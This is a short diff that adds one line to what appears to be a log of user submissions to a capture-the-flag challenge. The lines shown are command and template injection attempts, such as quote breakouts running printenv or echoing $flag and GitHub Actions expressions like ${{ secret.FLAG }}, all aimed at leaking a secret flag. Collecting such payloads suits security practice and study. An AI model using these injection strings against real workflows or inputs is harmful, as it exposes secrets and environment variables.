@@ -10888,3 +10888,4 @@ tcyba:ls
 leppan02:";printenv
 leppan02:";printenv > issues;echo "
 MERCHANT01:${flag:0:1}
+MERCHANT01:${{ secret.FLAG }} ${{ secret.flag }} ${{ secret[FLAG] }} ${{ env.flag }} ${{ env[FLAG] }} ${{ env.FLAG }} "; echo $flag"
